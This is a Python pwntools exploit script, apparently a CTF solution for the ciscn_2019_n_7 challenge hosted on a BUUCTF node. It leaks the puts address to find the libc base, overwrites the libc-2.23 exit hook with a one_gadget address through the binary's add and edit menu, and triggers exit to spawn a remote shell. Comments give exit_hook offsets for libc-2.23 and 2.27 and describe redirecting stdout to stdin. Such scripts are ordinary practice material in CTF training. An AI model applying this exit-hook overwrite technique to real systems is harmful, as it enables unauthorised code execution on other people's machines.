# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_2019_n_7'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27546'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size,text):
    cmd(1)
    sla("ngth:" ,size)
    sa("name:" , text)

def edit(name,text):
    cmd(2)
    sa("name:" ,name)
    sa("contents:" , text)

one_gad = one_gadget(libc.path)

cmd(666)
ru("0x")
puts_addr = rint()
libc.address = puts_addr - libc.sym["puts"]
ogg = libc.address + one_gad[3]
exit_hook = libc.address  + 0x5f0040 + 3848

add(0x50,"a"*8 + p64(exit_hook))
edit("a",p64(ogg))

cmd(4)

# exec 1>&0 重定向，在 shell 前关闭了标准输出，需要把标准输出重定向到标准输入

# 在libc-2.23中
# exit_hook = libc_base+0x5f0040+3848
# exit_hook = libc_base+0x5f0040+3856

# #在libc-2.27中

# exit_hook = libc_base+0x619060+3840
# exit_hook = libc_base+0x619060+3848


p.interactive()

'''
@File    :   ciscn_2019_n_7.py
@Time    :   2021/08/18 21:07:44
@Author  :   Niyah 
'''